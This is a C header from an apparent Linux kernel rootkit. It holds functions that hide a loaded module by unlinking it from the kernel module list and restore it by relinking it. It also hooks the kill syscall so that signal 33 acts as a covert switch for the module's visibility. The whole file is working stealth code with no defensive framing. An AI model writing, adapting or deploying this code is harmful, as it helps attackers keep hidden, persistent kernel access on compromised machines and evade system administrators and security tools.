
#ifndef KILL_H
#define KILL_H

#include <linux/module.h>
#include <linux/mutex.h>


static int hidden = 0;
static struct list_head *saved_anchor = NULL;
static asmlinkage long (*og_kill)(pid_t pid, int sig);

static void hideme(void)
{
    mutex_lock(&module_mutex);
    if (!hidden) {
        saved_anchor = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
        hidden = 1;
    }
    mutex_unlock(&module_mutex);
}

static void showme(void)
{
    mutex_lock(&module_mutex);
    if (hidden && saved_anchor) {
        /* validate: live list nodes have self-consistent back-links */
        if (saved_anchor->next && saved_anchor->next->prev == saved_anchor &&
            saved_anchor->prev && saved_anchor->prev->next == saved_anchor) {
            list_add(&THIS_MODULE->list, saved_anchor);
            hidden = 0;
        }
        /* invalid anchor: stay hidden; next hide/show cycle re-captures */
    }
    mutex_unlock(&module_mutex);
}

static asmlinkage long hooked_kill(pid_t pid, int sig)
{
    if (sig == 33) {
        if (hidden)
            showme();
        else
            hideme();
        return 0;
    }
    return og_kill(pid, sig);
}

#endif